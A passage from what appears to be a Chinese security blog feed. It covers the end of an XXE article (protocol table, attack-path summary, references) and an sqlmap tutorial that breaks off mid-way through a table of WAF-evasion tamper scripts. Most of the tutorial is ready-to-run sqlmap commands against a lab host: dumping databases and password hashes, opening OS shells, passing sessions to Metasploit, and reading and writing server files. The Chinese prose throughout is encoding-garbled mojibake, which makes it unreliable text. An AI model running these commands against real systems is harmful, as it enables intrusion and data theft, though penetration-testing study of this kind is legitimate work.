alt="image-20221101110422030"></a></p><p>VPSä¸ŠæˆåŠŸæ¥æ”¶æ‰§è¡Œå‘½ä»¤åçš„æ•°æ®ï¼Œæ•°æ®æ ¼å¼ä¸º base64</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101110717899.png" data-caption="image-20221101110717899"><img src="/../images/xxe/image-20221101110717899.png" alt="image-20221101110717899"></a></p><p>?p&#x3D;æ‰§è¡Œåè¿”å›æ•°æ®çš„ base64 æ ¼å¼ï¼Œè§£ç åå¾—åˆ°æ•°æ®</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101110833149.png" data-caption="image-20221101110833149"><img src="/../images/xxe/image-20221101110833149.png" alt="image-20221101110833149"></a></p><p>æ³¨æ„ libxml 2.9.0 ç‰ˆæœ¬åä¸æ”¯æŒè§£æå¤–éƒ¨å®ä½“ï¼Œå³æ— æ³•è¿›è¡Œè¿œç¨‹åŠ è½½ dtdã€‚</p><p><a data-fancybox="gallery" data-src="/../images/xxe/image-20221101093249009.png" data-caption="image-20221101093249009"><img src="/../images/xxe/image-20221101093249009.png" alt="image-20221101093249009"></a></p><p>ç»¼ä¸Šæ‰€è¿°ï¼ŒXXE æ¼æ´å®é™…ä¸Šéƒ½æ˜¯é€šè¿‡ file åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œç›¸å¯¹åº”å…¶ä»–å¹³å°åè®®å¦‚ä¸‹:</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">| libxml2 | PHP            | Java     | .NET  |</span><br><span class="line">| ------- | -------------- | -------- | ----- |</span><br><span class="line">| file    | file           | http     | file  |</span><br><span class="line">| http    | http           | https    | http  |</span><br><span class="line">| ftp     | ftp            | ftp      | https |</span><br><span class="line">|         | php            | file     | ftp   |</span><br><span class="line">|         | compress.zlib  | jar      |       |</span><br><span class="line">|         | compress.bzip2 | netdoc   |       |</span><br><span class="line">|         | data           | mailto   |       |</span><br><span class="line">|         | glob           | gopher * |       |</span><br><span class="line">|         | phar           |          |       |</span><br></pre></td></tr></table></figure></div><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>é€šè¿‡ä¸€ç³»åˆ—äº†è§£ï¼ŒXXE æ¼æ´é€šè¿‡ file åè®®è¿›è¡Œæœ¬åœ°æ–‡ä»¶è¯»å–ï¼Œç„¶åé€šè¿‡è¯»å–åˆ°çš„ä¿¡æ¯è¿›è¡Œç»„åˆæ”»å‡»ï¼Œç±»ä¼¼äº SSRFã€‚ä¸»è¦æ”»å‡»è·¯å¾„ï¼šæœ¬åœ°æ–‡ä»¶è¯»å–ã€å†…ç½‘è®¿é—®ã€ä¸»æœºæ‰«æ&#x2F;ç«¯å£æ‰«æã€è¿œç¨‹ä»£ç æ‰§è¡Œ<br>ã€æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p><h2 id="äº”ã€å‚è€ƒ"><a href="#äº”ã€å‚è€ƒ" class="headerlink" title="äº”ã€å‚è€ƒ"></a>äº”ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://blog.zsec.uk/blind-xxe-learning/</span><br><span class="line">https://www.freebuf.com/articles/web/265324.html</span><br><span class="line">https://mp.weixin.qq.com/s/mm4hxXzaiaXUFcKk_wrtCw</span><br><span class="line">https://github.com/c0ny1/xxe-lab</span><br><span class="line">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap è¿›é˜¶ä½¿ç”¨è€ƒç©¶</title>
      <link href="/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/"/>
      <url>/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>Sqlmap è¿™ä¹ˆä¼˜ç§€çš„è‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·å°±ä¸å¿…è¿‡å¤šä»‹ç»äº†ï¼Œä¹Ÿæ˜¯æ—¥å¸¸å·¥ä½œä¸­ä½¿ç”¨é¢‘ç‡æ¯”è¾ƒé«˜çš„ä¸€æ¬¾å·¥å…·ï¼Œæ–‡ç« ä¸»è¦è€ƒç©¶å…¶åŸºæœ¬ç”¨æ³•åŠéƒ¨åˆ†è¿›é˜¶ä½¿ç”¨æ‰‹æ®µã€‚</p><h2 id="äºŒã€sqlmapå¸¸ç”¨å‚æ•°"><a href="#äºŒã€sqlmapå¸¸ç”¨å‚æ•°" class="headerlink" title="äºŒã€sqlmapå¸¸ç”¨å‚æ•°"></a>äºŒã€sqlmapå¸¸ç”¨å‚æ•°</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">| å‘½ä»¤å‚æ•°                        | å‚æ•°ä½œç”¨                                                     |</span><br><span class="line">| ------------------------------ | ------------------------------------------------------------ |</span><br><span class="line">| -u                             | æŒ‡å®šç›®æ ‡url                                                  |</span><br><span class="line">| -r                             | ä»æ–‡ä»¶ä¸­åŠ è½½HTTPè¯·æ±‚ï¼ˆæ•°æ®åŒ…ï¼‰                               |</span><br><span class="line">| *                              | jsonæ ¼å¼æŒ‡å®šå‚æ•°ï¼Œå¦‚æŒ‡å®šå‚æ•°orderNoï¼š&#123;&quot;phoneNo&quot;:&quot;15123456789&quot;,&quot;platNum&quot;:&quot;844519422627945&quot;,&quot;orderNo&quot;:&quot;1*&quot;&#125; |</span><br><span class="line">| -m                             | ä»æ–‡æœ¬ä¸­è·å–å¤šä¸ªç›®æ ‡æ‰«æ                                     |</span><br><span class="line">| --data                         | ä»¥POSTæ–¹å¼æäº¤æ•°æ®                                           |</span><br><span class="line">| -random-agent                  | éšæœºUser-Agent                                               |</span><br><span class="line">| --user-agent                   | æŒ‡å®šUser-Agent                                               |</span><br><span class="line">| --delay                        | è®¾ç½®è¯·æ±‚é—´çš„å»¶è¿Ÿ                                             |</span><br><span class="line">| --timeout                      | æŒ‡å®šè¶…æ—¶æ—¶é—´                                                 |</span><br><span class="line">| --dbms                         | æŒ‡å®šdbï¼Œsqlmapæ”¯æŒçš„dbæœ‰MySQLã€Oracleã€PostgreSQLã€Microsoft SQL Serverã€Microsoft Accessã€SQLiteç­‰ |</span><br><span class="line">| --os                           | æŒ‡å®šæ•°æ®åº“æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ                                     |</span><br><span class="line">| --tamper                       | æŒ‡å®šè„šæœ¬tamper                                               |</span><br><span class="line">| --level                        | æŒ‡å®šæ¢æµ‹ç­‰çº§                                                 |</span><br><span class="line">| --risk                         | æŒ‡å®šé£é™©ç­‰çº§                                                 |</span><br><span class="line">| --technique                    | B: Boolean-based blind SQL injection&lt;br/&gt;E: Error-based SQL injection&lt;br/&gt;U: UNION query SQL injection&lt;br/&gt;S: Stacked queries SQL injection&lt;br/&gt;T: Time-based blind SQL injection |</span><br><span class="line">| -p                             | æŒ‡å®šéœ€è¦æµ‹è¯•çš„å‚æ•°                                           |</span><br><span class="line">| â€“batch                         | è‡ªåŠ¨é€‰æ‹©Y/N                                                  |</span><br><span class="line">| â€“dbs                           | æšä¸¾æ•°æ®åº“                                                   |</span><br><span class="line">| -D                             | DATABASEï¼šæŒ‡å®šæ•°æ®åº“                                         |</span><br><span class="line">| â€“tables                        | æšä¸¾è¡¨å                                                     |</span><br><span class="line">| -T                             | æŒ‡å®šè¡¨å                                                     |</span><br><span class="line">| â€“columns                       | æšä¸¾åˆ—å                                                     |</span><br><span class="line">| -D                             | COLUMNï¼šæŒ‡å®šå­—æ®µ                                             |</span><br><span class="line">| â€“dump                          | è„±å–æŒ‡å®šå­—æ®µ                                                 |</span><br><span class="line">| â€“dump-all                      | è„±å–æ•°æ®åº“å…¨éƒ¨å­—æ®µ                                           |</span><br><span class="line">| -a/â€“all                        | è·å–æ‰€æœ‰ä¿¡æ¯                                                 |</span><br><span class="line">| -b/â€“banner                     | è·å–bannerä¿¡æ¯                                               |</span><br><span class="line">| â€“current-user                  | è·å–å½“å‰æ•°æ®åº“ç”¨æˆ·                                           |</span><br><span class="line">| â€“is-dba                        | åˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯å¦ä¸ºDBAæƒé™                                    |</span><br><span class="line">| â€“users                         | æšä¸¾ç”¨æˆ·åˆ—è¡¨                                                 |</span><br><span class="line">| â€“sql-shell                     | è¿”å›äº¤äº’å¼æ•°æ®åº“çš„shell                                      |</span><br><span class="line">| â€“os-shell                      | è¿”å›äº¤äº’å¼çš„æ“ä½œç³»ç»Ÿshell                                    |</span><br><span class="line">| â€“os-cmd                        | æ‰§è¡ŒOSå‘½ä»¤CMD                                                |</span><br><span class="line">| â€“cookie=COOKIE                 | ä¼ªé€ cookie                                                   |</span><br><span class="line">| --proxy=PROXY                  | ä½¿ç”¨ä»£ç†è¿æ¥ç›®æ ‡ URL                                         |</span><br><span class="line">| --mobile                       | ä½¿ç”¨ HTTP User-Agent æ¨¡ä»¿æ™ºèƒ½æ‰‹æœº                            |</span><br><span class="line">| -H HEADER                      | è®¾ç½®é¢å¤–çš„ HTTP å¤´å‚æ•°ï¼ˆä¾‹å¦‚ï¼š&quot;X-Forwarded-For: 127.0.0.1&quot;ï¼‰ |</span><br><span class="line">| --ignore-proxy                 | å¿½ç•¥ç³»ç»Ÿé»˜è®¤ä»£ç†è®¾ç½®                                         |</span><br><span class="line">| *                              | åœ¨                                                           |</span><br><span class="line">| --keep-alive                   | ä¿æŒè¿æ¥ï¼Œå‡ºç°[CRITICAL] connection......æŠ¥é”™çš„æ—¶å€™ï¼Œä½¿ç”¨è¿™ä¸ªå‚æ•° |</span><br><span class="line">| --referer http://www.baidu.com | #ä¼ªé€ refererå­—æ®µ                                             |</span><br><span class="line">| -v 3                           | è¾“å‡ºè¯¦ç»†åº¦,æœ€å¤§å€¼5,ä¼šæ˜¾ç¤ºè¯·æ±‚åŒ…å’Œå›å¤åŒ…                      |</span><br><span class="line">| --roles                        | åˆ—å‡ºæ•°æ®åº“æ‰€æœ‰ç®¡ç†å‘˜è§’è‰²ï¼Œä»…é€‚ç”¨äºoracleæ•°æ®åº“çš„æ—¶å€™         |</span><br><span class="line">| --identify-waf                 | æ£€æµ‹æ˜¯å¦æœ‰WAF                                                |</span><br></pre></td></tr></table></figure></div><h2 id="ä¸‰ã€åŸºæœ¬ä½¿ç”¨"><a href="#ä¸‰ã€åŸºæœ¬ä½¿ç”¨" class="headerlink" title="ä¸‰ã€åŸºæœ¬ä½¿ç”¨"></a>ä¸‰ã€åŸºæœ¬ä½¿ç”¨</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># åŸºæœ¬è¯­æ³•</span><br><span class="line">sqlmap -r sql.txt  # sql.txtæ˜¯æˆ‘ä»¬æŠ“å–çš„ http è¯·æ±‚åŒ…</span><br><span class="line">sqlmap -r sql.txt -p username  # æŒ‡å®šå‚æ•°ï¼Œè¯·æ±‚åŒ…ä¸­å­˜åœ¨å¤šä¸ªå‚æ•°ï¼Œæ ¹æ®å‰æœŸæ¢æµ‹å·²çŸ¥æ³¨å…¥ç‚¹ä¸º usernameï¼Œæ‰€ä»¥å¯åˆ©ç”¨ -p æŒ‡å®šå‚æ•°ï¼Œå‡å°‘ä¸å¿…è¦çš„æ¢æµ‹</span><br><span class="line">sqlmap -u &quot;http://www.xxx.com/username/admin*&quot;         # å·²çŸ¥æ³¨å…¥å‚æ•°ï¼Œå¯ä»¥åœ¨å…¶åé¢åŠ ä¸ª*æ¥è®©sqlmapå¯¹å…¶æ³¨å…¥ï¼ŒpoståŒ…ä¸­jsonæ•°æ®ä¹Ÿå¯ä½¿ç”¨è¯¥*å·</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;   # æ¢æµ‹è¯¥urlæ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œå®é™…æ¢æµ‹ id å‚æ•°æ˜¯å¦å­˜åœ¨æ³¨å…¥</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --cookie=&quot;ç™»å½•æŠ“å–çš„cookie&quot;   # å½“è¯¥ç½‘ç«™éœ€è¦ç™»å½•æ—¶ï¼Œæ¢æµ‹è¯¥urlæ˜¯å¦å­˜åœ¨æ¼æ´</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;  # æŠ“å–å…¶postæäº¤çš„æ•°æ®å¡«å…¥è¿›è¡Œæ¢æµ‹</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --users      # æŸ¥çœ‹æ•°æ®åº“çš„æ‰€æœ‰ç”¨æˆ·</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --passwords  # æŸ¥çœ‹æ•°æ®åº“ç”¨æˆ·åçš„å¯†ç </span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;  --dbs       # æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;  --tables    # æŸ¥çœ‹æ‰€æœ‰æ•°æ®è¡¨</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;  --columns   # æŸ¥çœ‹æ•°æ®åº“ä¸­æ‰€æœ‰åˆ—</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;  --current-db         # æŸ¥çœ‹å½“å‰æ•°æ®åº“</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D æ•°æ®åº“å --tables       # æŸ¥çœ‹æŒ‡å®šæ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D æ•°æ®åº“å -T æ•°æ®è¡¨å --columns # æŸ¥çœ‹æŒ‡å®šæ•°æ®åº“ä¸­æŒ‡å®šè¡¨ä¸­çš„æ‰€æœ‰åˆ—</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D æ•°æ®åº“å -T æ•°æ®è¡¨å -C æ•°æ®åˆ— --dump  # æŸ¥çœ‹æŒ‡å®šæ•°æ®åº“ä¸­çš„æŒ‡å®šè¡¨ä¸­æŒ‡å®šåˆ—çš„æ‰€æœ‰æ•°æ®</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D æ•°æ®åº“å -T æ•°æ®è¡¨å -C æ•°æ®åˆ— --dump --start 1 --stop 10  # æŸ¥çœ‹æŒ‡å®šæ•°æ®åº“ä¸­çš„æŒ‡å®šè¡¨ä¸­æŒ‡å®šåˆ—çš„å‰10æ¡æ•°æ®</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D security -T users --dump-all # æŸ¥çœ‹æ•°æ®åº“securityä¸­çš„usersè¡¨ä¸­çš„æ‰€æœ‰æ•°æ®</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D security --dump-all   # æŸ¥çœ‹æ•°æ®åº“securityä¸­çš„æ‰€æœ‰æ•°æ®</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --dump-all  # æŸ¥çœ‹è¯¥æ•°æ®åº“ä¸­çš„æ‰€æœ‰æ•°æ®</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --tamper=space2comment.py  # æŒ‡å®šè„šæœ¬è¿›è¡Œè¿‡æ»¤ï¼Œç”¨/**/ä»£æ›¿ç©ºæ ¼</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --level=5 --risk=3 # æ¢æµ‹ç­‰çº§5ï¼Œå¹³å°å±é™©ç­‰çº§3ï¼Œéƒ½æ˜¯æœ€é«˜çº§åˆ«ã€‚å½“level=2æ—¶ï¼Œä¼šæµ‹è¯•cookieæ³¨å…¥ã€‚å½“level=3æ—¶ï¼Œä¼šæµ‹è¯•user-agent/refereræ³¨å…¥</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --dbms=&quot;MySQL&quot;     # æŒ‡å®šå…¶æ•°æ®åº“ä¸ºmysql</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --proxy=&quot;http://192.168.114.144:8080&quot;    #æŒ‡å®šä»£ç†</span><br><span class="line">å½“çˆ†ç ´HTTPSç½‘ç«™ä¼šå‡ºç°è¶…æ—¶çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨å‚æ•° --delay=3 --force-ssl</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --technique T    # æŒ‡å®šæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼Œè¿™ä¸ªå‚æ•°å¯ä»¥æŒ‡å®šsqlmapä½¿ç”¨çš„æ¢æµ‹æŠ€æœ¯ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šæµ‹è¯•æ‰€æœ‰çš„æ–¹å¼ï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‰‹å·¥æŒ‡å®šï¼Œ-tæ•ˆæœä¸€æ ·ã€‚</span><br><span class="line"></span><br><span class="line"># å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --sql-shell  # æ‰§è¡ŒæŒ‡å®šçš„sqlè¯­å¥</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --os-shell/--os-cmd   # æ‰§è¡Œ--os-shellå‘½ä»¤ï¼Œè·å–ç›®æ ‡æœåŠ¡å™¨æƒé™</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --os-pwn   # æ‰§è¡Œ--os-pwnå‘½ä»¤ï¼Œå°†ç›®æ ‡æƒé™å¼¹åˆ°MSFä¸Š</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --file-read &quot;c:/test.txt&quot; # è¯»å–ç›®æ ‡æœåŠ¡å™¨Cç›˜ä¸‹çš„test.txtæ–‡ä»¶</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --file-write  test.txt  --file-dest &quot;e:/hack.txt&quot;  # å°†æœ¬åœ°çš„test.txtæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨çš„Eç›˜ä¸‹ï¼Œå¹¶ä¸”åå­—ä¸ºhack.txt</span><br><span class="line">sqlmap -d &quot;mysql://root:root@192.168.114.14430:3306/mysql&quot; --os-shell   # çŸ¥é“ç½‘ç«™çš„è´¦å·å¯†ç ç›´æ¥è¿æ¥</span><br></pre></td></tr></table></figure></div><h2 id="å››ã€Temperè„šæœ¬"><a href="#å››ã€Temperè„šæœ¬" class="headerlink" title="å››ã€Temperè„šæœ¬"></a>å››ã€Temperè„šæœ¬</h2><h3 id="sqlmapè‡ªå¸¦è„šæœ¬"><a href="#sqlmapè‡ªå¸¦è„šæœ¬" class="headerlink" title="sqlmapè‡ªå¸¦è„šæœ¬"></a>sqlmapè‡ªå¸¦è„šæœ¬</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">| temper                       | function                                                     |</span><br><span class="line">| ---------------------------- | :----------------------------------------------------------- |</span><br><span class="line">| apostrophemask.py            | ç”¨UTF-8å…¨è§’å­—ç¬¦æ›¿æ¢&#x27;ï¼ˆä¾‹å¦‚&#x27;-&gt;ï¼…EFï¼…BCï¼…87ï¼‰                  |</span><br><span class="line">| apostrophenullencode.py      | ç”¨åŒunicodeæ›¿æ¢&#x27;ï¼ˆä¾‹å¦‚&#x27;-&gt;ï¼…00ï¼…27ï¼‰                          |</span><br><span class="line">| appendnullbyte.py            | åœ¨payloadçš„æœ«å°¾é™„åŠ NULLå­—èŠ‚å­—ç¬¦ï¼ˆï¼…00ï¼‰                      |</span><br><span class="line">| base64encode.py              | å¯¹payloadä¸­çš„æ‰€æœ‰å­—ç¬¦è¿›è¡Œbase64ç¼–ç                           |</span><br><span class="line">| between.py                   | ç”¨è¿ç®—ç¬¦ï¼ˆ&#x27;&gt;&#x27;ï¼‰æ›¿æ¢&#x27;NOT BETWEEN 0 ANDï¼ƒ&#x27;ï¼Œç”¨è¿ç®—ç¬¦ï¼ˆ&#x27;=&#x27;ï¼‰æ›¿æ¢&#x27;BETWEENï¼ƒANDï¼ƒ&#x27; |</span><br><span class="line">| bluecoat.py                  | ç”¨éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢è¯­å¥åçš„ç©ºæ ¼å­—ç¬¦ï¼Œä¹‹åç”¨è¿ç®—ç¬¦LIKEæ›¿æ¢å­—ç¬¦&#x27;=&#x27; |</span><br><span class="line">| chardoubleencode.py          | å¯¹payloadä¸­çš„æ‰€æœ‰å­—ç¬¦è¿›è¡ŒåŒé‡URLç¼–ç ï¼ˆä¾‹å¦‚SELECT-&gt;ï¼…2553ï¼…2545ï¼…254Cï¼…2545ï¼…2543ï¼…2554ï¼‰ |</span><br><span class="line">| charencode.py                | å¯¹payloadä¸­æ‰€æœ‰å­—ç¬¦è¿›è¡ŒURLç¼–ç ï¼ˆä¾‹å¦‚SELECT-&gt;ï¼…53ï¼…45ï¼…4Cï¼…45ï¼…43ï¼…54ï¼‰ |</span><br><span class="line">| charunicodeencode.py         | å¯¹payloadä¸­çš„æ‰€æœ‰å­—ç¬¦è¿›è¡Œunicodeç¼–ç ï¼ˆä¾‹å¦‚SELECT-&gt;ï¼…u0053ï¼…u0045ï¼…u004Cï¼…u0045ï¼…u0043ï¼…u0054ï¼‰ |</span><br><span class="line">| charunicodeescape.py         | ä½¿ç”¨Unicodeè½¬ä¹‰payloadä¸­çš„æœªç¼–ç å­—ç¬¦ï¼ˆä¾‹å¦‚SELECT-&gt;\u0053\u0045\u004C\u0045\u0043\u0054ï¼‰ |</span><br><span class="line">| commalesslimit.py            | ç”¨&#x27;LIMIT N OFFSET M&#x27;æ›¿æ¢ï¼ˆMySQLï¼‰å®ä¾‹ï¼Œä¾‹å¦‚&#x27;LIMIT Mï¼ŒN&#x27;      |</span><br><span class="line">| commalessmid.py              | ç”¨&#x27;MIDï¼ˆA FROM B FOR Cï¼‰&#x27;æ›¿æ¢ï¼ˆMySQLï¼‰å®ä¾‹ï¼Œä¾‹å¦‚&#x27;MIDï¼ˆAï¼ŒBï¼ŒCï¼‰&#x27; |</span><br><span class="line">| commentbeforeparentheses.py  | åœ¨æ‹¬å·å‰åŠ ï¼ˆå†…è”ï¼‰æ³¨é‡Šï¼ˆä¾‹å¦‚ï¼ˆï¼ˆ-&gt;/**/ï¼ˆï¼‰                   |</span><br><span class="line">| concat2concatws.py           | ç”¨&#x27;CONCAT_WSï¼ˆMIDï¼ˆCHARï¼ˆ0ï¼‰ï¼Œ0ï¼Œ0ï¼‰ï¼ŒAï¼ŒBï¼‰&#x27;æ›¿æ¢ï¼ˆMySQLï¼‰å®ä¾‹ï¼Œä¾‹å¦‚&#x27;CONCATï¼ˆAï¼ŒBï¼‰&#x27; ã€‚ |</span><br><span class="line">| equaltolike.py               | å°†ï¼ˆ&#x27;=&#x27;ï¼‰è¿ç®—ç¬¦æ›¿æ¢ä¸º&#x27;LIKE&#x27;                                  |</span><br><span class="line">| escapequotes.py              | æ–œæ è½¬ä¹‰å•å¼•å·å’ŒåŒå¼•å·ï¼ˆä¾‹å¦‚&#x27;-&gt; \&#x27;ï¼‰                         |</span><br><span class="line">| great.py                     | æ›¿æ¢è¿ç®—ç¬¦ï¼ˆ&#x27;&gt;&#x27; ï¼‰å’Œ&#x27;GREATEST&#x27;å¯¹åº”                           |</span><br><span class="line">| Halfversionedmorekeywords.py | åœ¨æ¯ä¸ªå…³é”®å­—å‰æ·»åŠ mysqlæ³¨é‡Š                                  |</span><br><span class="line">| hex2char.py                  | æ›¿æ¢æ¯ä¸ªï¼ˆMySQLï¼‰0xç­‰æ•ˆçš„CONCATï¼ˆCHARï¼ˆï¼‰ï¼Œ...ï¼‰ç¼–ç å­—ç¬¦ä¸²   |</span><br><span class="line">| htmlencode.py                | ç”¨HTMLç¼–ç ï¼ˆä½¿ç”¨ä»£ç ç‚¹ï¼‰æ‰€æœ‰éå­—æ¯æ•°å­—å­—ç¬¦ï¼ˆä¾‹å¦‚&#x27;-&gt;&#x27;ï¼‰       |</span><br><span class="line">| ifnull2casewhenisnull.py     | ç»•è¿‡å¯¹ IFNULL è¿‡æ»¤,æ›¿æ¢ç±»ä¼¼â€™IFNULL(A, B)â€™ä¸ºâ€™IF(ISNULL(A), B, A)â€™ |</span><br><span class="line">| ifnull2ifisnull.py           | 